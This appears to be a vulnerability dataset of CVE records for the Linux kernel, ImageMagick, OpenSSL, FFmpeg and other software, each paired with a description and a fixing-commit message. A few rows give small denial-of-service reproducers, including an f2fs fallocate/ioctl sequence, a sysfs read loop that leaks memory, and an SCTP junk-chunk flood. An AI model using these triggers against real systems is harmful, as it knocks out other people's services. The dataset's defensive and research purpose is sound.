CVE-2016-10058,CWE-400,2017-03-23,Memory leak in the ReadPSDLayers function in coders/psd.c in ImageMagick before 6.9.6-3 allows remote attackers to cause a denial of service (memory consumption) via a crafted image file.,
CVE-2019-14283,CWE-125,2019-07-26,"In the Linux kernel before 5.2.3, set_geometry in drivers/block/floppy.c does not validate the sect and head fields, as demonstrated by an integer overflow and out-of-bounds read. It can be triggered by an unprivileged local user when a floppy disk has been inserted. NOTE: QEMU creates the floppy device by default.","This fixes a global out-of-bounds read access in the copy_buffer function of the floppy driver.  The FDDEFPRM ioctl allows one to set the geometry of a disk.  The sect and head fields (unsigned int) of the floppy_drive structure are used to compute the max_sector (int) in the make_raw_rw_request function.  It is possible to overflow the max_sector.  Next, max_sector is passed to the copy_buffer function and used in one of the memcpy calls.  An unprivileged user could trigger the bug if the device is accessible, but requires a floppy disk to be inserted.  The patch adds the check for the .sect * .head multiplication for not overflowing in the set_geometry function.  The bug was found by syzkaller.  Signed-off-by: Denis Efremov <efremov@ispras.ru> Tested-by: Willy Tarreau <w@1wt.eu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-1559,CWE-203,2019-02-27,"If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable ""non-stitched"" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
CVE-2013-4127,CWE-399,2013-07-29,Use-after-free vulnerability in the vhost_net_set_backend function in drivers/vhost/net.c in the Linux kernel through 3.10.3 allows local users to cause a denial of service (OOPS and system crash) via vectors involving powering on a virtual machine.,"vhost_net_ubuf_put_and_wait has a confusing name: it will actually also free it's argument. Thus since commit 1280c27     ""vhost-net: flush outstanding DMAs on memory change"" vhost_net_flush tries to use the argument after passing it to vhost_net_ubuf_put_and_wait, this results in use after free. To fix, don't free the argument in vhost_net_ubuf_put_and_wait, add an new API for callers that want to free ubufs.  Acked-by: Asias He <asias@redhat.com> Acked-by: Jason Wang <jasowang@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-9619,CWE-119,2017-07-26,The xps_true_callback_glyph_name function in xps/xpsttf.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (Segmentation Violation and application crash) via a crafted file.,
CVE-2016-4486,CWE-200,2016-05-23,"The rtnl_fill_link_ifmap function in net/core/rtnetlink.c in the Linux kernel before 4.5.5 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory by reading a Netlink message.",The stack object “map” has a total size of 32 bytes. Its last 4 bytes are padding generated by compiler. These padding bytes are not initialized and sent out via “nla_put”.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2011-1079,CWE-20,2012-06-21,"The bnep_sock_ioctl function in net/bluetooth/bnep/sock.c in the Linux kernel before 2.6.39 does not ensure that a certain device field ends with a '\0' character, which allows local users to obtain potentially sensitive information from kernel stack memory, or cause a denial of service (BUG and system crash), via a BNEPCONNADD command.","Struct ca is copied from userspace.  It is not checked whether the ""device"" field is NULL terminated.  This potentially leads to BUG() inside of alloc_netdev_mqs() and/or information leak by creating a device with a name made of contents of kernel stack.  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>"
CVE-2015-4177,,2016-05-02,"The collect_mounts function in fs/namespace.c in the Linux kernel before 4.0.5 does not properly consider that it may execute after a path has been unmounted, which allows local users to cause a denial of service (system crash) by leveraging user-namespace root access for an MNT_DETACH umount2 system call.","The only users of collect_mounts are in audit_tree.c  In audit_trim_trees and audit_add_tree_rule the path passed into collect_mounts is generated from kern_path passed an audit_tree pathname which is guaranteed to be an absolute path.   In those cases collect_mounts is obviously intended to work on mounted paths and if a race results in paths that are unmounted when collect_mounts it is reasonable to fail early.  The paths passed into audit_tag_tree don't have the absolute path check.  But are used to play with fsnotify and otherwise interact with the audit_trees, so again operating only on mounted paths appears reasonable.  Avoid having to worry about what happens when we try and audit unmounted filesystems by restricting collect_mounts to mounts that appear in the mount tree.  Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2015-1191,CWE-22,2015-01-21,Multiple directory traversal vulnerabilities in pigz 2.3.1 allow remote attackers to write to arbitrary files via a (1) full pathname or (2) .. (dot dot) in an archive.,This uses the path of the compressed file combined with the name from the header as the name of the decompressed output file.  Any path information in the header name is stripped.  This avoids a possible vulnerability where absolute or descending paths are put in the gzip header.
CVE-2011-1476,CWE-189,2012-06-21,Integer underflow in the Open Sound System (OSS) subsystem in the Linux kernel before 2.6.39 on unspecified non-x86 platforms allows local users to cause a denial of service (memory corruption) by leveraging write access to /dev/sequencer.,
CVE-2015-4645,CWE-190,2017-03-17,"Integer overflow in the read_fragment_table_4 function in unsquash-4.c in Squashfs and sasquatch allows remote attackers to cause a denial of service (application crash) via a crafted input, which triggers a stack-based buffer overflow.","Add more filesystem table sanity checks to Unsquashfs-4 and also properly fix CVE-2015-4645 and CVE-2015-4646.  The CVEs were raised due to Unsquashfs having variable oveflow and stack overflow in a number of vulnerable functions.  The suggested patch only ""fixed"" one such function and fixed it badly, and so it was buggy and introduced extra bugs!  The suggested patch was not only buggy, but, it used the essentially wrong approach too.  It was ""fixing"" the symptom but not the cause.  The symptom is wrong values causing overflow, the cause is filesystem corruption. This corruption should be detected and the filesystem rejected *before* trying to allocate memory.  This patch applies the following fixes:  1. The filesystem super-block tables are checked, and the values    must match across the filesystem.     This will trap corrupted filesystems created by Mksquashfs.  2. The maximum (theorectical) size the filesystem tables could grow    to, were analysed, and some variables were increased from int to    long long.     This analysis has been added as comments.  3. Stack allocation was removed, and a shared buffer (which is    checked and increased as necessary) is used to read the    table indexes.  Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>"
CVE-2018-20458,CWE-125,2018-12-25,"In radare2 prior to 3.1.1, r_bin_dyldcache_extract in libr/bin/format/mach0/dyldcache.c may allow attackers to cause a denial-of-service (application crash caused by out-of-bounds read) by crafting an input file.",
CVE-2015-0207,,2015-03-19,"The dtls1_listen function in d1_lib.c in OpenSSL 1.0.2 before 1.0.2a does not properly isolate the state information of independent data streams, which allows remote attackers to cause a denial of service (application crash) via crafted DTLS traffic, as demonstrated by DTLS 1.0 traffic to a DTLS 1.2 server.",
CVE-2013-4353,CWE-20,2014-01-09,The ssl3_take_mac function in ssl/s3_both.c in OpenSSL 1.0.1 before 1.0.1f allows remote TLS servers to cause a denial of service (NULL pointer dereference and application crash) via a crafted Next Protocol Negotiation record in a TLS handshake.,
CVE-2011-4348,CWE-362,2013-06-08,"Race condition in the sctp_rcv function in net/sctp/input.c in the Linux kernel before 2.6.29 allows remote attackers to cause a denial of service (system hang) via SCTP packets.  NOTE: in some environments, this issue exists because of an incomplete fix for CVE-2011-2482.","There is a race between sctp_rcv() and sctp_accept() where we have moved the association from the listening socket to the accepted socket, but sctp_rcv() processing cached the old socket and continues to use it.  The easy solution is to check for the socket mismatch once we've grabed the socket lock.  If we hit a mis-match, that means that were are currently holding the lock on the listening socket, but the association is refrencing a newly accepted socket.  We need to drop the lock on the old socket and grab the lock on the new one.  A more proper solution might be to create accepted sockets when the new association is established, similar to TCP.  That would eliminate the race for 1-to-1 style sockets, but it would still existing for 1-to-many sockets where a user wished to peeloff an association.  For now, we'll live with this easy solution as it addresses the problem.  Reported-by: Michal Hocko <mhocko@suse.cz> Reported-by: Karsten Keil <kkeil@suse.de> Signed-off-by: Vlad Yasevich <vladislav.yasevich@hp.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-3138,CWE-20,2017-09-28,print-wb.c in tcpdump before 4.7.4 allows remote attackers to cause a denial of service (segmentation fault and process crash).,This is a follow-up to commit 3a3ec26.
CVE-2017-12664,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePALMImage in coders/palm.c.,
CVE-2017-18257,CWE-190,2018-04-04,The __get_data_block function in fs/f2fs/data.c in the Linux kernel before 4.11 allows local users to cause a denial of service (integer overflow and loop) via crafted use of the open and fallocate system calls with an FS_IOC_FIEMAP ioctl.,"A dead loop can be triggered in f2fs_fiemap() using the test case as below:  	... 	fd = open(); 	fallocate(fd, 0, 0, 4294967296); 	ioctl(fd, FS_IOC_FIEMAP, fiemap_buf); 	...  It's caused by an overflow in __get_data_block(): 	... 	bh->b_size = map.m_len << inode->i_blkbits; 	... map.m_len is an unsigned int, and bh->b_size is a size_t which is 64 bits on 64 bits archtecture, type conversion from an unsigned int to a size_t will result in an overflow.  In the above-mentioned case, bh->b_size will be zero, and f2fs_fiemap() will call get_data_block() at block 0 again an again.  Fix this by adding a force conversion before left shift.  Signed-off-by: Wei Fang <fangwei1@huawei.com> Acked-by: Chao Yu <yuchao0@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2016-9537,CWE-119,2016-11-22,"tools/tiffcrop.c in libtiff 4.0.6 has out-of-bounds write vulnerabilities in buffers. Reported as MSVR 35093, MSVR 35096, and MSVR 35097.","in heap or stack allocated buffers. Reported as MSVR 35093, MSVR 35096 and MSVR 35097. Discovered by Axel Souchet and Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team. * tools/tiff2pdf.c: fix out-of-bounds write vulnerabilities in heap allocate buffer in t2p_process_jpeg_strip(). Reported as MSVR 35098. Discovered by Axel Souchet and Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team. * libtiff/tif_pixarlog.c: fix out-of-bounds write vulnerabilities in heap allocated buffers. Reported as MSVR 35094. Discovered by Axel Souchet and Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team. * libtiff/tif_write.c: fix issue in error code path of TIFFFlushData1() that didn't reset the tif_rawcc and tif_rawcp members. I'm not completely sure if that could happen in practice outside of the odd behaviour of t2p_seekproc() of tiff2pdf). The report points that a better fix could be to check the return value of TIFFFlushData1() in places where it isn't done currently, but it seems this patch is enough. Reported as MSVR 35095. Discovered by Axel Souchet & Vishal Chauhan & Suha Can from the MSRC Vulnerabilities & Mitigations team."
CVE-2018-12453,CWE-704,2018-06-16,Type confusion in the xgroupCommand function in t_stream.c in redis-server in Redis before 5.0 allows remote attackers to cause denial-of-service via an XGROUP command in which the key is not a stream.,
CVE-2014-2669,CWE-189,2014-03-31,"Multiple integer overflows in contrib/hstore/hstore_io.c in PostgreSQL 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact via vectors related to the (1) hstore_recv, (2) hstore_from_arrays, and (3) hstore_from_array functions in contrib/hstore/hstore_io.c; and the (4) hstoreArrayToPairs function in contrib/hstore/hstore_op.c, which triggers a buffer overflow.  NOTE: this issue was SPLIT from CVE-2014-0064 because it has a different set of affected versions.","Several functions, mostly type input functions, calculated an allocation size such that the calculation wrapped to a small positive value when arguments implied a sufficiently-large requirement.  Writes past the end of the inadvertent small allocation followed shortly thereafter. Coverity identified the path_in() vulnerability; code inspection led to the rest.  In passing, add check_stack_depth() to prevent stack overflow in related functions.  Back-patch to 8.4 (all supported versions).  The non-comment hstore changes touch code that did not exist in 8.4, so that part stops at 9.0.  Noah Misch and Heikki Linnakangas, reviewed by Tom Lane.  Security: CVE-2014-0064"
CVE-2016-10267,CWE-369,2017-03-24,"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image, related to libtiff/tif_ojpeg.c:816:8.","OJPEGPreDecode(). This will avoid a divide by zero, and potential other issues. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2611"
CVE-2019-13306,CWE-193,2019-07-05,ImageMagick 7.0.8-50 Q16 has a stack-based buffer overflow at coders/pnm.c in WritePNMImage because of off-by-one errors.,
CVE-2018-13300,CWE-125,2018-07-05,"In FFmpeg 3.2 and 4.0.1, an improper argument (AVCodecParameters) passed to the avpriv_request_sample function in the handle_eac3 function in libavformat/movenc.c may trigger an out-of-array read while converting a crafted AVI file to MPEG4, leading to a denial of service and possibly an information disclosure.","Fixes: out of array read Fixes: ffmpeg_crash_8.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 95556e2) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2018-1091,CWE-119,2018-03-27,"In the flush_tmregs_to_thread function in arch/powerpc/kernel/ptrace.c in the Linux kernel before 4.13.5, a guest kernel crash can be triggered from unprivileged userspace during a core dump on a POWER host due to a missing processor feature check and an erroneous use of transactional memory (TM) instructions in the core dump path, leading to a denial of service.","Commit cd63f3c (""powerpc/tm: Fix saving of TM SPRs in core dump"") added code to access TM SPRs in flush_tmregs_to_thread(). However flush_tmregs_to_thread() does not check if TM feature is available on CPU before trying to access TM SPRs in order to copy live state to thread structures. flush_tmregs_to_thread() is indeed guarded by CONFIG_PPC_TRANSACTIONAL_MEM but it might be the case that kernel was compiled with CONFIG_PPC_TRANSACTIONAL_MEM enabled and ran on a CPU without TM feature available, thus rendering the execution of TM instructions that are treated by the CPU as illegal instructions.  The fix is just to add proper checking in flush_tmregs_to_thread() if CPU has the TM feature before accessing any TM-specific resource, returning immediately if TM is no available on the CPU. Adding that checking in flush_tmregs_to_thread() instead of in places where it is called, like in vsr_get() and vsr_set(), is better because avoids the same problem cropping up elsewhere.  Cc: stable@vger.kernel.org # v4.13+ Fixes: cd63f3c (""powerpc/tm: Fix saving of TM SPRs in core dump"") Signed-off-by: Gustavo Romero <gromero@linux.vnet.ibm.com> Reviewed-by: Cyril Bur <cyrilbur@gmail.com> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
CVE-2014-2013,CWE-119,2014-03-03,Stack-based buffer overflow in the xps_parse_color function in xps/xps-common.c in MuPDF 1.3 and earlier allows remote attackers to execute arbitrary code via a large number of entries in the ContextColor value of the Fill attribute in a Path element.,
CVE-2019-13302,CWE-125,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer over-read in MagickCore/fourier.c in ComplexImages.,
CVE-2016-4817,,2016-06-19,"lib/http2/connection.c in H2O before 1.7.3 and 2.x before 2.0.0-beta5 mishandles HTTP/2 disconnection, which allows remote attackers to cause a denial of service (use-after-free and application crash) or possibly execute arbitrary code via a crafted packet.","lib/http2/connection.c:on_read() calls parse_input(), which might free `conn`. It does so in particular if the connection preface isn't the expected one in expect_preface(). `conn` is then used after the free in `if (h2o_timeout_is_linked(&conn->_write.timeout_entry)`. We fix this by adding a return value to close_connection that returns a negative value if `conn` has been free'd and can't be used anymore.  Credits for finding the bug to Tim Newsham."
CVE-2014-2972,CWE-189,2014-09-04,"expand.c in Exim before 4.83 expands mathematical comparisons twice, which allows local users to gain privileges and execute arbitrary commands via a crafted lookup value.",
CVE-2017-9620,CWE-125,2017-07-26,"The xps_select_font_encoding function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document, related to the xps_encode_font_char_imp function.",
CVE-2017-17081,CWE-125,2017-11-30,"The gmc_mmx function in libavcodec/x86/mpegvideodsp.c in FFmpeg 2.3 and 3.4 does not properly validate widths and heights, which allows remote attackers to cause a denial of service (integer signedness error and out-of-array read) via a crafted MPEG file.","Fixes: out of array read Fixes: 3516/attachment-311488.dat  Found-by: Insu Yun, Georgia Tech. Tested-by: wuninsu@gmail.com Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2016-10133,CWE-119,2017-03-24,"Heap-based buffer overflow in the js_stackoverflow function in jsrun.c in Artifex Software, Inc. MuJS allows attackers to have unspecified impact by leveraging an error when dropping extra arguments to lightweight functions.",
CVE-2017-14604,CWE-20,2017-09-20,"GNOME Nautilus before 3.23.90 allows attackers to spoof a file type by using the .desktop file extension, as demonstrated by an attack in which a .desktop file's Name field ends in .pdf but this file's Exec field launches a malicious ""sh -c"" command. In other words, Nautilus provides no UI indication that a file actually has the potentially unsafe .desktop extension; instead, the UI only shows the .pdf extension. One (slightly) mitigating factor is that an attack requires the .desktop file to have execute permission. The solution is to ask the user to confirm that the file is supposed to be treated as a .desktop file, and then remember the user's answer in the metadata::trusted field.","Currently we only trust desktop files that have the executable bit set, and don't replace the displayed icon or the displayed name until it's trusted, which prevents for running random programs by a malicious desktop file.  However, the executable permission is preserved if the desktop file comes from a compressed file.  To prevent this, add a metadata::trusted metadata to the file once the user acknowledges the file as trusted. This adds metadata to the file, which cannot be added unless it has access to the computer.  Also remove the SHEBANG ""trusted"" content we were putting inside the desktop file, since that doesn't add more security since it can come with the file itself.  https://bugzilla.gnome.org/show_bug.cgi?id=777991"
CVE-2017-13021,CWE-125,2017-09-14,The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2011-2909,CWE-200,2014-02-15,The do_devinfo_ioctl function in drivers/staging/comedi/comedi_fops.c in the Linux kernel before 3.1 allows local users to obtain sensitive information from kernel memory via a copy of a short string.,"driver_name and board_name are pointers to strings, not buffers of size COMEDI_NAMELEN.  Copying COMEDI_NAMELEN bytes of a string containing less than COMEDI_NAMELEN-1 bytes would leak some unrelated bytes.  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Cc: stable <stable@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2017-6214,CWE-835,2017-02-23,The tcp_splice_read function in net/ipv4/tcp.c in the Linux kernel before 4.9.11 allows remote attackers to cause a denial of service (infinite loop and soft lockup) via vectors involving a TCP packet with the URG flag.,"Splicing from TCP socket is vulnerable when a packet with URG flag is received and stored into receive queue.  __tcp_splice_read() returns 0, and sk_wait_data() immediately returns since there is the problematic skb in queue.  This is a nice way to burn cpu (aka infinite loop) and trigger soft lockups.  Again, this gem was found by syzkaller tool.  Fixes: 9c55e01 (""[TCP]: Splice receive support."") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Dmitry Vyukov  <dvyukov@google.com> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9559,CWE-476,2017-03-01,coders/tiff.c in ImageMagick before 7.0.3.7 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via a crafted image.,
CVE-2011-3209,CWE-189,2012-10-03,The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.,"x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Signed-off-by: Roman Zippel <zippel@linux-m68k.org> Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-12460,CWE-476,2018-06-15,"libavcodec in FFmpeg 4.0 may trigger a NULL pointer dereference if the studio profile is incorrectly detected while converting a crafted AVI file to MPEG4, leading to a denial of service, related to idctdsp.c and mpegvideo.c.","These 2 fields are not always the same, it is simpler to always use the same field for detecting studio profile  Fixes: null pointer dereference Fixes: ffmpeg_crash_3.avi  Found-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2013-1959,CWE-264,2013-05-03,"kernel/user_namespace.c in the Linux kernel before 3.8.9 does not have appropriate capability requirements for the uid_map and gid_map files, which allows local users to gain privileges by opening a file within an unprivileged process and then modifying the file within a privileged process.","When we require privilege for setting /proc/<pid>/uid_map or /proc/<pid>/gid_map no longer allow an unprivileged user to open the file and pass it to a privileged program to write to the file.  Instead when privilege is required require both the opener and the writer to have the necessary capabilities.  I have tested this code and verified that setting /proc/<pid>/uid_map fails when an unprivileged user opens the file and a privielged user attempts to set the mapping, that unprivileged users can still map their own id, and that a privileged users can still setup an arbitrary mapping.  Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Andy Lutomirski <luto@amacapital.net>"
CVE-2017-18344,CWE-125,2018-07-26,"The timer_create syscall implementation in kernel/time/posix-timers.c in the Linux kernel before 4.14.8 doesn't properly validate the sigevent->sigev_notify field, which leads to out-of-bounds access in the show_timer function (called when /proc/$PID/timers is read). This allows userspace applications to read arbitrary kernel memory (on a kernel built with CONFIG_POSIX_TIMERS and CONFIG_CHECKPOINT_RESTORE).","timer_create() specifies via sigevent->sigev_notify the signal delivery for the new timer. The valid modes are SIGEV_NONE, SIGEV_SIGNAL, SIGEV_THREAD and (SIGEV_SIGNAL | SIGEV_THREAD_ID).  The sanity check in good_sigevent() is only checking the valid combination for the SIGEV_THREAD_ID bit, i.e. SIGEV_SIGNAL, but if SIGEV_THREAD_ID is not set it accepts any random value.  This has no real effects on the posix timer and signal delivery code, but it affects show_timer() which handles the output of /proc/$PID/timers. That function uses a string array to pretty print sigev_notify. The access to that array has no bound checks, so random sigev_notify cause access beyond the array bounds.  Add proper checks for the valid notify modes and remove the SIGEV_THREAD_ID masking from various code pathes as SIGEV_NONE can never be set in combination with SIGEV_THREAD_ID.  Reported-by: Eric Biggers <ebiggers3@gmail.com> Reported-by: Dmitry Vyukov <dvyukov@google.com> Reported-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: John Stultz <john.stultz@linaro.org> Cc: stable@vger.kernel.org"
CVE-2015-6564,CWE-264,2015-08-24,Use-after-free vulnerability in the mm_answer_pam_free_ctx function in monitor.c in sshd in OpenSSH before 7.0 on non-OpenBSD platforms might allow local users to gain privileges by leveraging control of the sshd uid to send an unexpectedly early MONITOR_REQ_PAM_FREE_CTX request.,
CVE-2014-3688,CWE-399,2014-11-30,"The SCTP implementation in the Linux kernel before 3.17.4 allows remote attackers to cause a denial of service (memory consumption) by triggering a large number of chunks in an association's output queue, as demonstrated by ASCONF probes, related to net/sctp/inqueue.c and net/sctp/sm_statefuns.c.","This scenario is not limited to ASCONF, just taken as one example triggering the issue. When receiving ASCONF probes in the form of ...    -------------- INIT[ASCONF; ASCONF_ACK] ------------->   <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------   ---- ASCONF_a; [ASCONF_b; ...; ASCONF_n;] JUNK ------>   [...]   ---- ASCONF_m; [ASCONF_o; ...; ASCONF_z;] JUNK ------>  ... where ASCONF_a, ASCONF_b, ..., ASCONF_z are good-formed ASCONFs and have increasing serial numbers, we process such ASCONF chunk(s) marked with !end_of_packet and !singleton, since we have not yet reached the SCTP packet end. SCTP does only do verification on a chunk by chunk basis, as an SCTP packet is nothing more than just a container of a stream of chunks which it eats up one by one.  We could run into the case that we receive a packet with a malformed tail, above marked as trailing JUNK. All previous chunks are here goodformed, so the stack will eat up all previous chunks up to this point. In case JUNK does not fit into a chunk header and there are no more other chunks in the input queue, or in case JUNK contains a garbage chunk header, but the encoded chunk length would exceed the skb tail, or we came here from an entirely different scenario and the chunk has pdiscard=1 mark (without having had a flush point), it will happen, that we will excessively queue up the association's output queue (a correct final chunk may then turn it into a response flood when flushing the queue ;)): I ran a simple script with incremental ASCONF serial numbers and could see the server side consuming excessive amount of RAM [before/after: up to 2GB and more].  The issue at heart is that the chunk train basically ends with !end_of_packet and !singleton markers and since commit 2e3216c (""sctp: Follow security requirement of responding with 1 packet"") therefore preventing an output queue flush point in sctp_do_sm() -> sctp_cmd_interpreter() on the input chunk (chunk = event_arg) even though local_cork is set, but its precedence has changed since then. In the normal case, the last chunk with end_of_packet=1 would trigger the queue flush to accommodate possible outgoing bundling.  In the input queue, sctp_inq_pop() seems to do the right thing in terms of discarding invalid chunks. So, above JUNK will not enter the state machine and instead be released and exit the sctp_assoc_bh_rcv() chunk processing loop. It's simply the flush point being missing at loop exit. Adding a try-flush approach on the output queue might not work as the underlying infrastructure might be long gone at this point due to the side-effect interpreter run.  One possibility, albeit a bit of a kludge, would be to defer invalid chunk freeing into the state machine in order to possibly trigger packet discards and thus indirectly a queue flush on error. It would surely be better to discard chunks as in the current, perhaps better controlled environment, but going back and forth, it's simply architecturally not possible. I tried various trailing JUNK attack cases and it seems to look good now.  Joint work with Vlad Yasevich.  Fixes: 2e3216c (""sctp: Follow security requirement of responding with 1 packet"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-6543,CWE-200,2013-03-15,"The l2tp_ip6_getname function in net/l2tp/l2tp_ip6.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.",The L2TP code for IPv6 fails to initialize the l2tp_unused member of struct sockaddr_l2tpip6 and that for leaks two bytes kernel stack via the getsockname() syscall. Initialize l2tp_unused with 0 to avoid the info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: James Chapman <jchapman@katalix.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2011-3353,CWE-120,2012-05-24,Buffer overflow in the fuse_notify_inval_entry function in fs/fuse/dev.c in the Linux kernel before 3.1 allows local users to cause a denial of service (BUG_ON and system crash) by leveraging the ability to mount a FUSE filesystem.,
CVE-2014-9322,CWE-269,2014-12-17,"arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space.","On a 32-bit kernel, this has no effect, since there are no IST stacks.  On a 64-bit kernel, #SS can only happen in user code, on a failed iret to user space, a canonical violation on access via RSP or RBP, or a genuine stack segment violation in 32-bit kernel code.  The first two cases don't need IST, and the latter two cases are unlikely fatal bugs, and promoting them to double faults would be fine.  This fixes a bug in which the espfix64 code mishandles a stack segment violation.  This saves 4k of memory per CPU and a tiny bit of code.  Signed-off-by: Andy Lutomirski <luto@amacapital.net> Reviewed-by: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2018-7757,CWE-772,2018-03-08,"Memory leak in the sas_smp_get_phy_events function in drivers/scsi/libsas/sas_expander.c in the Linux kernel through 4.15.7 allows local users to cause a denial of service (memory consumption) via many read accesses to files in the /sys/class/sas_phy directory, as demonstrated by the /sys/class/sas_phy/phy-1:0:12/invalid_dword_count file.","We've got a memory leak with the following producer:  while true; do cat /sys/class/sas_phy/phy-1:0:12/invalid_dword_count >/dev/null; done  The buffer req is allocated and not freed after we return. Fix it.  Fixes: 2908d77 (""[SCSI] aic94xx: new driver"") Signed-off-by: Jason Yan <yanaijie@huawei.com> CC: John Garry <john.garry@huawei.com> CC: chenqilin <chenqilin2@huawei.com> CC: chenxiang <chenxiang66@hisilicon.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Hannes Reinecke <hare@suse.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2019-15945,CWE-119,2019-09-05,OpenSC before 0.20.0-rc1 has an out-of-bounds access of an ASN.1 Bitstring in decode_bit_string in libopensc/asn1.c.,Credit to OSS-Fuzz
CVE-2013-2015,CWE-399,2013-04-29,"The ext4_orphan_del function in fs/ext4/namei.c in the Linux kernel before 3.7.3 does not properly handle orphan-list entries for non-journal filesystems, which allows physically proximate attackers to cause a denial of service (system hang) via a crafted filesystem on removable media, as demonstrated by the e2fsprogs tests/f_orphan_extents_inode/image.gz test.","When trying to mount a file system which does not contain a journal, but which does have a orphan list containing an inode which needs to be truncated, the mount call with hang forever in ext4_orphan_cleanup() because ext4_orphan_del() will return immediately without removing the inode from the orphan list, leading to an uninterruptible loop in kernel code which will busy out one of the CPU's on the system.  This can be trivially reproduced by trying to mount the file system found in tests/f_orphan_extents_inode/image.gz from the e2fsprogs source tree.  If a malicious user were to put this on a USB stick, and mount it on a Linux desktop which has automatic mounts enabled, this could be considered a potential denial of service attack.  (Not a big deal in practice, but professional paranoids worry about such things, and have even been known to allocate CVE numbers for such problems.)  Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu> Reviewed-by: Zheng Liu <wenqing.lz@taobao.com> Cc: stable@vger.kernel.org"
